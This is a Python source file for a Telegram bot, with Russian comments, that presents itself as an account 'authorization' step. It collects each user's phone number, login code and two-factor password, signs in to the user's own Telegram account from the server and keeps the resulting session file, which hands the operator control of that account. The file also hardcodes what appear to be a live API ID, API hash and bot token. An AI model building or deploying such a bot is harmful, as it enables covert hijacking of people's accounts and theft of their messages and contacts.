import asyncio
import logging
import sqlite3
import os
import sys
from datetime import datetime

# Проверка зависимостей
try:
    from telethon import TelegramClient, events, Button
    print("✅ Telethon успешно импортирован")
except ImportError:
    print("❌ Telethon не установлен! Запустите: pip install telethon==1.28.5")
    sys.exit(1)

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SimpleAuthBot:
    def __init__(self):
        # ⚠️ ЗАМЕНИТЕ ЭТИ ДАННЫЕ НА РЕАЛЬНЫЕ!
        self.API_ID = 29385016
        self.API_HASH = '3c57df8805ab5de5a23a032ed39b9af9'
        self.BOT_TOKEN = '8324933170:AAFatQ1T42ZJ70oeWS2UJkcXFeiwUFCIXAk'
        
        self.bot_client = None
        self.setup_database()
        
        # Состояния пользователей
        self.user_states = {}  # user_id -> 'waiting_phone', 'waiting_code', etc.
        self.user_sessions = {}  # user_id -> session_data
        
    def setup_database(self):
        """Настройка простой базы данных"""
        self.conn = sqlite3.connect('users.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                phone TEXT,
                authorized_at TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')
        self.conn.commit()
        logger.info("✅ База данных готова")
    
    async def initialize(self):
        """Инициализация бота без запроса телефона в консоли"""
        try:
            logger.info("🔄 Запускаю бота...")
            
            self.bot_client = TelegramClient(
                'bot_session', 
                self.API_ID, 
                self.API_HASH
            )
            
            # Запускаем бота без интерактивного ввода
            await self.bot_client.start(bot_token=self.BOT_TOKEN)
            
            logger.info("✅ Бот успешно запущен!")
            self.setup_handlers()
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            raise
    
    def setup_handlers(self):
        """Настройка обработчиков сообщений"""
        
        @self.bot_client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            """Обработчик команды /start"""
            user_id = event.sender_id
            logger.info(f"👤 Пользователь {user_id} запустил бота")
            
            if await self.is_user_authorized(user_id):
                await self.show_main_menu(event)
            else:
                await self.start_auth(event)
        
        @self.bot_client.on(events.NewMessage)
        async def message_handler(event):
            """Обработчик всех сообщений"""
            user_id = event.sender_id
            text = event.text.strip()
            
            if text.startswith('/'):
                return
                
            state = self.user_states.get(user_id, 'start')
            
            if state == 'waiting_phone':
                await self.handle_phone_input(event, text)
            elif state == 'waiting_code':
                await self.handle_code_input(event, text)
            elif state == 'waiting_password':
                await self.handle_password_input(event, text)
        
        @self.bot_client.on(events.CallbackQuery)
        async def callback_handler(event):
            """Обработчик callback кнопок"""
            user_id = event.sender_id
            data = event.data.decode('utf-8')
            
            if not await self.is_user_authorized(user_id):
                await event.answer("❌ Сначала авторизуйтесь!", alert=True)
                return
            
            if data == "profile":
                await self.show_profile(event)
            elif data == "settings":
                await event.answer("⚙️ Настройки скоро будут доступны!", alert=True)
            elif data == "logout":
                await self.logout_user(event)
            elif data == "resend_code":
                await self.resend_code(event)
    
    async def is_user_authorized(self, user_id):
        """Проверка авторизации пользователя"""
        self.cursor.execute('SELECT * FROM users WHERE user_id = ? AND is_active = 1', (user_id,))
        return self.cursor.fetchone() is not None
    
    async def start_auth(self, event):
        """Начало процесса авторизации"""
        user_id = event.sender_id
        
        welcome_text = """
🔐 **Авторизация в боте**

Для использования бота необходимо авторизовать ваш Telegram аккаунт.

📱 **Введите ваш номер телефона в формате:**
• +79123456789
• +380123456789

**Отправьте ваш номер:**
        """
        
        self.user_states[user_id] = 'waiting_phone'
        await event.reply(welcome_text, parse_mode='md')
        logger.info(f"📱 Запрошен номер у пользователя {user_id}")
    
    async def handle_phone_input(self, event, phone):
        """Обработка ввода номера телефона"""
        user_id = event.sender_id
        
        # Простая валидация номера
        if not phone.startswith('+') or len(phone) < 10:
            await event.reply("❌ **Неверный формат номера!**\n\nВведите номер в международном формате, например: +79123456789\n\n**Попробуйте еще раз:**")
            return
        
        try:
            # Создаем клиент для пользователя
            session_name = f"user_{user_id}"
            client = TelegramClient(session_name, self.API_ID, self.API_HASH)
            await client.connect()
            
            # Отправляем код
            sent_code = await client.send_code_request(phone)
            
            # Сохраняем данные сессии
            self.user_sessions[user_id] = {
                'phone': phone,
                'client': client,
                'phone_code_hash': sent_code.phone_code_hash
            }
            
            self.user_states[user_id] = 'waiting_code'
            
            buttons = [
                [Button.inline("🔄 Отправить код повторно", b"resend_code")]
            ]
            
            await event.reply(
                f"✅ **Код отправлен на номер {phone}**\n\n"
                "📨 Проверьте ваши Telegram приложения и введите полученный код:\n\n"
                "**Введите код:**",
                buttons=buttons
            )
            logger.info(f"📨 Код отправлен на {phone} для пользователя {user_id}")
            
        except Exception as e:
            logger.error(f"❌ Ошибка отправки кода: {e}")
            await event.reply(f"❌ **Ошибка:** {str(e)}\n\nПопробуйте другой номер или повторите позже.")
    
    async def handle_code_input(self, event, code):
        """Обработка ввода кода подтверждения"""
        user_id = event.sender_id
        
        if user_id not in self.user_sessions:
            await event.reply("❌ **Сессия устарела!** Начните заново с /start")
            return
        
        # Очищаем код
        code = ''.join(filter(str.isdigit, code))
        
        if len(code) != 5:
            await event.reply("❌ **Код должен содержать 5 цифр!**\n\n**Введите код еще раз:**")
            return
        
        try:
            session_data = self.user_sessions[user_id]
            client = session_data['client']
            
            # Пытаемся войти с кодом
            await client.sign_in(
                phone=session_data['phone'],
                code=code,
                phone_code_hash=session_data['phone_code_hash']
            )
            
            # Успешная авторизация!
            await self.handle_success_auth(event, user_id, session_data)
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Ошибка входа: {error_msg}")
            
            if 'password' in error_msg.lower():
                await event.reply("🔒 **Требуется пароль 2FA**\n\nВведите ваш пароль двухфакторной аутентификации:")
                self.user_states[user_id] = 'waiting_password'
            else:
                await event.reply(f"❌ **Неверный код!**\n\nОшибка: {error_msg}\n\n**Введите код еще раз:**")
    
    async def handle_password_input(self, event, password):
        """Обработка ввода пароля 2FA"""
        user_id = event.sender_id
        
        if user_id not in self.user_sessions:
            await event.reply("❌ **Сессия устарела!** Начните заново с /start")
            return
        
        try:
            session_data = self.user_sessions[user_id]
            client = session_data['client']
            
            # Входим с паролем
            await client.sign_in(password=password)
            
            # Успешная авторизация!
            await self.handle_success_auth(event, user_id, session_data)
            
        except Exception as e:
            await event.reply(f"❌ **Неверный пароль!**\n\nОшибка: {str(e)}\n\n**Введите пароль еще раз:**")
    
    async def resend_code(self, event):
        """Повторная отправка кода"""
        user_id = event.sender_id
        
        if user_id in self.user_sessions:
            try:
                session_data = self.user_sessions[user_id]
                sent_code = await session_data['client'].send_code_request(session_data['phone'])
                session_data['phone_code_hash'] = sent_code.phone_code_hash
                
                await event.answer("✅ Код отправлен повторно!", alert=True)
                await event.edit("📨 **Код отправлен повторно!**\n\nВведите полученный код:")
            except Exception as e:
                await event.answer("❌ Ошибка отправки кода!", alert=True)
        else:
            await event.answer("❌ Сессия устарела! Начните заново.", alert=True)
    
    async def handle_success_auth(self, event, user_id, session_data):
        """Обработка успешной авторизации"""
        try:
            # Сохраняем пользователя в БД
            self.cursor.execute('''
                INSERT OR REPLACE INTO users (user_id, phone, authorized_at, is_active)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_data['phone'], datetime.now().isoformat(), 1))
            self.conn.commit()
            
            # Получаем информацию о пользователе
            client = session_data['client']
            me = await client.get_me()
            
            # Очищаем временные данные
            if user_id in self.user_sessions:
                # Отключаем клиент, но сохраняем сессию
                await client.disconnect()
                del self.user_sessions[user_id]
            if user_id in self.user_states:
                del self.user_states[user_id]
            
            success_text = f"""
🎉 **Авторизация успешна!**

✅ Добро пожаловать, **{me.first_name or 'Пользователь'}**!

Теперь вы можете использовать все функции бота.
            """
            
            await event.reply(success_text, parse_mode='md')
            await self.show_main_menu(event)
            
            logger.info(f"✅ Пользователь {user_id} успешно авторизован")
            
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            await event.reply("❌ **Ошибка сохранения!** Попробуйте с /start")
    
    async def show_main_menu(self, event):
        """Главное меню после авторизации"""
        menu_text = """
🏠 **Главное меню**

Выберите действие:
        """
        
        buttons = [
            [Button.inline("📊 Профиль", b"profile")],
            [Button.inline("⚙️ Настройки", b"settings")],
            [Button.inline("🚪 Выйти", b"logout")]
        ]
        
        await event.reply(menu_text, buttons=buttons)
    
    async def show_profile(self, event):
        """Показать профиль пользователя"""
        user_id = event.sender_id
        
        self.cursor.execute('SELECT phone, authorized_at FROM users WHERE user_id = ?', (user_id,))
        result = self.cursor.fetchone()
        
        if result:
            phone, auth_date = result
            profile_text = f"""
👤 **Ваш профиль**

📱 Номер: `{phone}`
📅 Авторизован: `{auth_date[:10]}`
🆔 ID: `{user_id}`
            """
            await event.edit(profile_text, parse_mode='md')
    
    async def logout_user(self, event):
        """Выход из аккаунта"""
        user_id = event.sender_id
        
        self.cursor.execute('UPDATE users SET is_active = 0 WHERE user_id = ?', (user_id,))
        self.conn.commit()
        
        # Удаляем сессию
        session_file = f"user_{user_id}.session"
        if os.path.exists(session_file):
            os.remove(session_file)
        
        # Удаляем временные данные
        if user_id in self.user_sessions:
            if self.user_sessions[user_id].get('client'):
                await self.user_sessions[user_id]['client'].disconnect()
            del self.user_sessions[user_id]
        if user_id in self.user_states:
            del self.user_states[user_id]
        
        await event.edit("✅ **Вы вышли из аккаунта!**\n\nДля входа используйте /start")
        logger.info(f"🚪 Пользователь {user_id} вышел из системы")
    
    async def run(self):
        """Запуск бота"""
        await self.initialize()
        logger.info("🤖 Бот запущен и готов к работе!")
        
        # Информация о боте
        me = await self.bot_client.get_me()
        logger.info(f"👤 Бот: @{me.username} (ID: {me.id})")
        
        await self.bot_client.run_until_disconnected()

# Запуск бота
if __name__ == '__main__':
    bot = SimpleAuthBot()
    
    try:
        print("🚀 Запускаю бота авторизации...")
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
    except Exception as e:
        print(f"💥 Критическая ошибка: {e}")
    finally:
        if hasattr(bot, 'conn'):
            bot.conn.close()
        print("👋 Работа завершена")
